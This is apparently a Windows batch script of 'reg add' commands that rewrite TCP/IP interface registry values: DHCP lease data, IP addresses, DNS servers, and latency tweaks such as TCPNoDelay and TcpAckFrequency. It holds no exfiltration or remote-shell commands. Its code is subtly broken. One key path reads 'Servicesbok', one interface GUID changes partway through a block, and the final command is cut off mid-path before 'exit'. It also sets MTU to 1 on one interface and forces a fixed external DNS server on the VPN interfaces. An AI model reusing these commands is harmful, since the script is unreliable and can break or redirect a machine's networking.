reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v RegisterAdapterName /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v DhcpIPAddress /t REG_SZ /d "192.168.1.30" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Servicesbok\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v DhcpSubnetMask /t REG_SZ /d "255.255.255.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v DhcpServer /t REG_SZ /d "192.168.1.254" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v Lease /t REG_DWORD /d 43200 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v LeaseObtainedTime /t REG_DWORD /d 1467144140 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v T1 /t REG_DWORD /d 1467165804 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v T2 /t REG_DWORD /d 1467179764 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v LeaseTerminatesTime /t REG_DWORD /d 1467185804 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v AddressType /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v IsServerNapAware /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v DhcpConnForceBroadcastFlag /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v DhcpNetworkHint /t REG_SZ /d "6427565626F687D2241314736363" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v DhcpGatewayHardwareCount /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v DhcpNameServer /t REG_SZ /d "192.168.1.254" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v DhcpDefaultGateway /t REG_SZ /d "192.168.1.254" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565626F687D2241314736363" /v DhcpSubnetMaskOpt /t REG_SZ /d "255.255.255.0" /f

reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v UseZeroBroadcast /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v EnableDeadGWDetect /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v EnableDHCP /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v NameServer /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v Domain /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v RegistrationEnabled /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v RegisterAdapterName /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v DhcpIPAddress /t REG_SZ /d "10.49.225.216" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v DhcpSubnetMask /t REG_SZ /d "255.248.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v DhcpServer /t REG_SZ /d "10.55.255.254" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v Lease /t REG_DWORD /d 130 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v LeaseObtainedTime /t REG_DWORD /d 1467117574 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v T1 /t REG_DWORD /d 1467117607 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v T2 /t REG_DWORD /d 1467117623 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v LeaseTerminatesTime /t REG_DWORD /d 1467117640 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v AddressType /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v IsServerNapAware /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v DhcpConnForceBroadcastFlag /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v DhcpNetworkHint /t REG_SZ /d "6427565675966696" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v DhcpGatewayHardwareCount /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v DhcpNameServer /t REG_SZ /d "212.27.40.241 212.27.40.240" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v DhcpDefaultGateway /t REG_SZ /d "10.55.255.254" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\6427565675966696" /v DhcpSubnetMaskOpt /t REG_SZ /d "255.248.0.0" /f
color 6
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v UseZeroBroadcast /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v EnableDeadGWDetect /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v EnableDHCP /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v NameServer /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v Domain /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v RegistrationEnabled /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B10CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v RegisterAdapterName /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v DhcpIPAddress /t REG_SZ /d "192.168.223.106" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v DhcpSubnetMask /t REG_SZ /d "255.255.255.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v DhcpServer /t REG_SZ /d "192.168.223.1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v Lease /t REG_DWORD /d 86400 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v LeaseObtainedTime /t REG_DWORD /d 1467117598 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v T1 /t REG_DWORD /d 1467161086 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v T2 /t REG_DWORD /d 1467179374 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v LeaseTerminatesTime /t REG_DWORD /d 1467189150 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v AddressType /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v IsServerNapAware /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v DhcpConnForceBroadcastFlag /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v DhcpNetworkHint /t REG_SZ /d "8405D2052796E647D29344D2F46666963656A656470243633303" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v DhcpGatewayHardwareCount /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{4B60CC79-0175-4BDC-8B2D-5CA4AA06F32A}\8405D2052796E647D29344D2F46666963656A656470243633303" /v DhcpSubnetMaskOpt /t REG_SZ /d "255.255.255.0" /f
color 7
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{708573E3-B871-4F8A-9447-EC9F706F7DCE}" /v VPNInterface /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{708573E3-B871-4F8A-9447-EC9F706F7DCE}" /v DhcpIPAddress /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{708573E3-B871-4F8A-9447-EC9F706F7DCE}" /v DhcpSubnetMask /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{708573E3-B871-4F8A-9447-EC9F706F7DCE}" /v Domain /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{708573E3-B871-4F8A-9447-EC9F706F7DCE}" /v NameServer /t REG_SZ /d "104.197.191.4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{708573E3-B871-4F8A-9447-EC9F706F7DCE}" /v RegistrationEnabled /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{708573E3-B871-4F8A-9447-EC9F706F7DCE}" /v RegisterAdapterName /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{708573E3-B871-4F8A-9447-EC9F706F7DCE}" /v MTU /t REG_DWORD /d 5188 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{708573E3-B871-4F8A-9447-EC9F706F7DCE}" /v TCPNoDelay /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{708573E3-B871-4F8A-9447-EC9F706F7DCE}" /v TcpAckFrequency /t REG_DWORD /d 1 /f
color 7
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{74CE9FE5-FCB4-4CA7-A2E2-F4826A481FC4}" /v VPNInterface /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{74CE9FE5-FCB4-4CA7-A2E2-F4826A481FC4}" /v DhcpIPAddress /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{74CE9FE5-FCB4-4CA7-A2E2-F4826A481FC4}" /v DhcpSubnetMask /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{74CE9FE5-FCB4-4CA7-A2E2-F4826A481FC4}" /v Domain /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{74CE9FE5-FCB4-4CA7-A2E2-F4826A481FC4}" /v NameServer /t REG_SZ /d "104.197.191.4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{74CE9FE5-FCB4-4CA7-A2E2-F4826A481FC4}" /v RegistrationEnabled /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{74CE9FE5-FCB4-4CA7-A2E2-F4826A481FC4}" /v RegisterAdapterName /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{74CE9FE5-FCB4-4CA7-A2E2-F4826A481FC4}" /v MTU /t REG_DWORD /d 5188 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{74CE9FE5-FCB4-4CA7-A2E2-F4826A481FC4}" /v TCPNoDelay /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{74CE9FE5-FCB4-4CA7-A2E2-F4826A481FC4}" /v TcpAckFrequency /t REG_DWORD /d 1 /f
color 7
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{846ee342-7039-11de-9d20-806e6f6e6963}" /v MTU /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{846ee342-7039-11de-9d20-806e6f6e6963}" /v TCPNoDelay /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{846ee342-7039-11de-9d20-806e6f6e6963}" /v TcpAckFrequency /t REG_DWORD /d 1 /f
color 7
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{9430F82A-33AD-4805-A245-036425D9039E}" /v VPNInterface /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{9430F82A-33AD-4805-A245-036425D9039E}" /v DhcpIPAddress /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\
exit